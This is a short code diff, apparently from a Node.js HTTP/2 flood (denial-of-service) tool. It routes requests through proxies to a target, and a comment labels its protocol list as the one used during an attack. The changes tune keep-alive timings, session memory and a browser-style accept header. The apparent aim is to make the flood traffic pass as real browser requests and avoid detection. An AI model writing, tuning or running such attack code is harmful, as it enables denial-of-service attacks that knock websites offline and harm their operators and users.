@@ -72,7 +72,7 @@ const net = require("net");
      });
  
      connection.setTimeout(options.timeout * 10000);
-     connection.setKeepAlive(true, 100000);
+     connection.setKeepAlive(true, 10000);
  
      connection.on("connect", () => {
          connection.write(buffer);
@@ -104,7 +104,7 @@ const net = require("net");
  headers[":method"] = "GET";
  headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "https";
- headers["accept"] = "/";
+ headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
  headers["accept-language"] = "en-US,en;q=0.9";
  headers["accept-encoding"] = "gzip, deflate";
  headers["cache-control"] = "no-cache";
@@ -128,7 +128,7 @@ const net = require("net");
      Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
  
-         connection.setKeepAlive(true, 100000);
+         connection.setKeepAlive(true, 10000);
 
          const tlsOptions = {
             ALPNProtocols: ['h2', 'http/1.1', 'h3', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'], // Protocol List ketika ATTACK
@@ -163,7 +163,7 @@ const net = require("net");
             maxHeaderListSize: 262144,
             enablePush: false
           },
-             maxSessionMemory: 3333,
+             maxSessionMemory: 333,
              maxDeflateDynamicTableSize: 4294967295,
              createConnection: () => tlsConn,
              socket: connection,
